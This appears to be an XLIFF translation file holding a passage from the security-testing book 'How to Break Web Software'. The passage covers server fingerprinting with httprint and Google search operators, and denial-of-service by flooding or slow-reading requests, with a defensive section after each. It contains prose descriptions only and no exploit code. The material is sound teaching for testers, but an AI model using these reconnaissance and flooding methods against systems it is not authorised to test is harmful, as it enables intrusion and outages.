          <source>Apache achieves this by running the Web server as the &lt;tt&gt;nobody&lt;/tt&gt; user, or in the case of Internet Information Server, the &lt;tt&gt;IUSR_COMPUTERNAME&lt;/tt&gt; account. This &lt;tt&gt;nobody&lt;/tt&gt; user shouldn't own files or be able to write to them, but it should be able to read files in the Web root directory and below. (In Windows, this is &lt;tt&gt;c:/inetpub/wwwroot/&lt;/tt&gt;.) This means that if an attacker tries to piggyback commands onto the underlying operating system, the commands will fail to execute, or they will execute without enough privilege to perform damaging tasks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 19 Fingerprinting the Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It seems counterintuitive, but most successful attacks against Web servers exploit existing bugs&amp;mdash;bugs that are known but not yet fixed. If we know about a bug, why not fix it so that exploits are impossible?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Unfortunately, the solution isn't that simple.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The lifecycle of a bug can be quite long, often measuring into years. You can find, report, and fix a bug, but then you must propagate the fix to the field. This is the crux of the problem. Many companies are slow to upgrade because they don't want to take their servers offline for the necessary reboot, or they are afraid the patch might break their Web applications. Thus, it is more than possible that a faulty Web server could be running your application right now!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The trick is to be aware of what Web server your application is running on and knowing what known bugs and exploits it is vulnerable to. This means keeping up with e-mail lists like BugTraq on &lt;a class="docLink" target="_blank" href="http://www.securityfocus.com"&gt;www.securityfocus.com&lt;/a&gt;, vendor update Web sites, or other watchdog sites like CERT (&lt;a class="docLink" target="_blank" href="http://www.cert.org"&gt;www.cert.org&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For an attacker to know that your server is susceptible to some known attack, he must first determine what kind of software is running on your server. If he can determine this, he can apply the right exploit aimed at a known bug.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is aimed at determining whether an attacker can discover what kind of server your Web application is running on. This is called &lt;span class="docEmphStrong"&gt;fingerprinting&lt;/span&gt;, and the idea is to find the version of the Web server and look up a known exploit for it. For example, if we know that the target Web server is an unpatched IIS 5.0, we could target a buffer overflow vulnerability in the indexing services. (This was the vulnerability that the CodeRed worm used to take over nearly 400,000 Web servers in just 14 hours&amp;mdash;&lt;a class="docLink" target="_blank" href="http://www.cert.org/advisories/CA-2001-19.html"&gt;http://www.cert.org/advisories/CA-2001-19.html&lt;/a&gt;.) This is not something we want happening to our Web site!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Looking for known vulnerabilities in a system used to be a time-consuming task of checking version numbers and searching vendor databases. Now we have tools to perform the job much quicker. We can even use Google to discover information that would be useful to an attacker. Worms are now using this method to look for targets&amp;mdash;the Santy worm utilized the search engine's results to find sites that were running vulnerable versions of phpBB (&lt;a class="docLink" target="_blank" href="http://www.phpbb.com"&gt;www.phpbb.com&lt;/a&gt;), a popular piece of forum software.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Rather than auditing the code on the Web server from the inside, this attack searches for what attackers can find out about the server from the outside.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although we've left this attack until quite late in the book, it's an activity that you should perform just before deploying the server and at regular intervals throughout its lifetime because Web servers are not simply static machines that never get updated. Configurations change, new services are added and removed, software gets updated, files are uploaded by users. One small file may mean the difference between a secure server and one that a hacker has full control over.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Knowing the current version of various software applications on Web servers is valuable information to an attacker, but in some cases it may be hard to come by. Therefore, we rely on a selection of tools to take over a lot of the manual testing for us.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Discovering the software and version number of a target Web server may at first glance seem easy. After all, one of the HTTP headers lists the server and version as part of every response (see &lt;a class="docLink" href="#ch07fig02"&gt;Figure 7-2&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-2. Checking out the SERVER string for &lt;a class="docLink" target="_blank" href="http://ibm.com"&gt;ibm.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you knew what type of Web server a site was running, you could easily search for known vulnerabilities and target certain attacks based on the platform. (There is no point in looking for the &lt;tt&gt;/etc/passwd&lt;/tt&gt; file on a Windows machine.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, you can easily change these server strings. IIS administrators can employ the URLScan tool and a configuration file setting, and Apache users can use the &lt;tt&gt;mod_headers&lt;/tt&gt; module and set the string passed back on responses with the following directive in the &lt;tt&gt;http.conf&lt;/tt&gt; file:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>Header set Server "HackProof Server-1.1"</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Attackers know this, too, so there's a nice little tool available called HTTPrint (&lt;a class="docLink" target="_blank" href="http://net-square.com/httprint/"&gt;http://net-square.com/httprint/&lt;/a&gt;). This tool works by sending different requests to the server and looking at the responses that the server returns. For example, consider the following requests, one to Microsoft (which presumably uses an IIS server), and one to Apache (which also presumably uses its own server).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-3. Server headers from &lt;a class="docLink" target="_blank" href="http://Microsoft.com"&gt;Microsoft.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Notice that some of the headers are in a different order. Even if we didn't have the server string, there are enough differences in the way that these two Web servers produce responses that, given numerous requests, we have a good chance of figuring out what software and version these servers are running.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-4. Server headers from &lt;a class="docLink" target="_blank" href="http://apache.org"&gt;apache.org&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is exactly the method that httprint uses to identify servers. Despite Foundstone's Web server identifying itself as a WebSTAR, httprint thinks it's probably an Apache 2.0 server. (That's only with 54% confidence, though. Other possibilities show that it is likely to be an Apache server of some version.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-5. Fingerprinting &lt;a class="docLink" target="_blank" href="http://foundstone.com"&gt;foundstone.com&lt;/a&gt; with httprint.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After we know (or we have reasonable certainty of) the type and version of the target Web server, &lt;a class="docLink" target="_blank" href="http://securityfocus.com"&gt;securityfocus.com&lt;/a&gt; or the Open Source Vulnerability Database (&lt;a class="docLink" target="_blank" href="http://www.osvdb.org"&gt;www.osvdb.org&lt;/a&gt;) can show what known flaws there are in that environment.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-6. Checking existing vulnerabilities on &lt;a class="docLink" target="_blank" href="http://securityfocus.com"&gt;securityfocus.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When attackers aren't interested in one particular server, but just any server that they can exploit, they need a quick and easy way to identify Web servers that are vulnerable to a given exploit. Enter everyone's favorite search engine, Google.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In addition to searches by keywords, Google has a number of advanced operators that you can set with a query that can be useful to attackers. For example, if you are looking for certain types of file, you would use &lt;tt&gt;filetype:doc&lt;/tt&gt; to instruct Google to return only Microsoft Word files. Try doing a search for &lt;tt&gt;confidential&lt;/tt&gt; or &lt;tt&gt;financial results&lt;/tt&gt; with the file type set either to doc or xls and see how many results you get back.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 7-7. Searching for vulnerabilities on the Open Source Vulnerability Database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There's a whole raft of operators that Google supports. Going into them here would be beyond the scope of this book. (&lt;span class="docEmphasis"&gt;Google Hacking for Penetration Testers&lt;/span&gt; [1]) is the definitive guide on the subject.) You can test by hand all the possible combinations of queries to see what is being found on your site, but that's time consuming; j0hnny (of Google hacking fame) currently lists more than 1,000 different query strings in his database (&lt;a class="docLink" target="_blank" href="http://johnny.ihackstuff.com/index.php?module=prodreviews"&gt;http://johnny.ihackstuff.com/index.php?module=prodreviews&lt;/a&gt;). Foundstone's SiteDigger tool (&lt;a class="docLink" target="_blank" href="http://www.foundstone.com/resources/proddesc/sitedigger.htm"&gt;www.foundstone.com/resources/proddesc/sitedigger.htm&lt;/a&gt;) executes all these tests and more from a simple GUI and prints a nice report.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The only way of protecting against these types of attacks is to know what the hackers know. Keep up with BugTraq (&lt;a class="docLink" target="_blank" href="http://www.securityfocus.com"&gt;www.securityfocus.com&lt;/a&gt;) or other vulnerability mailing lists so that you are informed of new findings in a timely manner.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As for other information that is available on the Internet, perform regular reconnaissance work on your own site using tools like SiteDigger. The general rule of thumb is that if it's already in Google, it's common knowledge. However, you can always fix the leak on your server (and change passwords or institute other countermeasures) and then contact Google to remove pages at &lt;a class="docLink" target="_blank" href="http://www.google.com/remove.html"&gt;http://www.google.com/remove.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 20 Denial of Service</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the unavoidable consequences of executing code is that it takes time. For each function called, be it by the Web server, the application, or the database, a certain number of processor cycles are used in executing that function. If that operation is long lived and the operating system does not or cannot switch to another program, the machine is tied up servicing just this one request.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For this reason, most modern Web servers are multithreaded or multiprocess&amp;mdash;consisting of many worker tasks giving the operating system an opportunity to switch to another task if one is taking too long and slowing up the others. As an example, the Apache Web server utilizes 10 worker processes (as a default) to handle incoming requests.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We have a potential attack here, though. If we can flood the Web server with enough requests to service long-running operations, we can deny other users from accessing the Web site. This is also known as a &lt;span class="docEmphStrong"&gt;Denial of Service&lt;/span&gt; (or DOS) attack, or as some hackers call it, death by a thousand cuts.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What we are looking for are places in the Web application that take a long time to return results to the browser. Searches, for example, are a natural place to start looking, but so are places where SQL queries are executed. If a place doesn't naturally exist, then you can use other attacks, like SQL injection, and force the database to perform Cartesian product joins&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch07fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; or long-running/infinite loops. But in general, as you use the site, you'll be able to identify the places that take the longest time to process your input.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch07fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; Every row in a database table is combined with every other row, which is effectively a multiplication operation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Alternatively, another approach is to request a page but be slow in accepting the data in response. As long as data is being accepted, the Web server should keep the connection open until it receives everything. If we had lots of these types of requests happening at the same time, the Web server could be able to reach the limit of its pool of connections and have none available for other users, once again denying them the availability of the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's not possible to overload a Web server directly using a browser, because the browser itself is limited in the number of connections it can make. According to the Internet standard RFC 2616, this number should be a maximum of 2.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>To bypass this restriction, you have to write a custom program. This is much easier than it sounds. It's a simple script that forks off multiple child processes, all requesting the same URL (preferably one with a slow-running operation), or one that keeps the connection open so that other requests cannot use it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If we run such scripts like this at our target Web server, we can determine whether the attack is working. Using another computer (so we might not be affected by the denial of service attempt), we try to connect and use the application. Any degradation in performance means that this attack is working to some degree. An attacker can easily &amp;quot;turn the knob&amp;quot; and involve more scripts, even more computers, to affect the target server further.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Protecting against this attack is extremely difficult, especially from the Web server or application point of view. If availability is of primary concern (say, the application is a high-use e-commerce application, or it's a trading system where responsiveness is critical), then from the beginning you need to design protection against denial of service in your applications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Utilizing clustering and load balancing helps alleviate the problem, because connections can be distributed across multiple machines. With a large enough network of machines, however, all directing denial of service requests (a distributed denial of service attack&amp;mdash;DDOS&amp;mdash;as MafiaBoy directed against eBay and Amazon in 2001&amp;mdash;&lt;a class="docLink" target="_blank" href="http://news.bbc.co.uk/1/hi/sci/tech/1541252.stm"&gt;http://news.bbc.co.uk/1/hi/sci/tech/1541252.stm&lt;/a&gt;), even this architecture can become flooded with requests.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Perhaps the best way of dealing with this kind of attack is to use intrusion detection systems (IDS) or bandwidth management solutions. Any pattern of misuse such as long-lived connections or an unusual amount of similar traffic to an address or group of addresses can trigger firewall updates to block these requests. However, you can use that approach even against legitimate users by launching attacks that identify themselves as &lt;a name="iddle1011"&gt;&lt;/a&gt;originating at large ISP proxies. Take, for example, America Online (AOL). If we could get an IDS or bandwidth manager to ban AOL's IP addresses, we could disconnect millions of users and achieve one of the goals of the attack. Therefore, we have to carefully design and review all solutions.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch07lev1sec3.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Johnny Long. &lt;span class="docEmphasis"&gt;Google Hacking for Penetration Testers&lt;/span&gt; (Syngress Publishing, June 2001).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch08.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 8. Authentication</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 8. Authentication</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch07lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch08lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter discusses authentication, a topic that is of utmost importance in many Web applications that must validate machines, users, or accounts. There are many ways of implementing authentication and several ways of breaking it, and Web developers should be familiar with both. This chapter covers four techniques for breaking Web-based authentication that every Web project stakeholder should be aware of.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch08lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch08lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
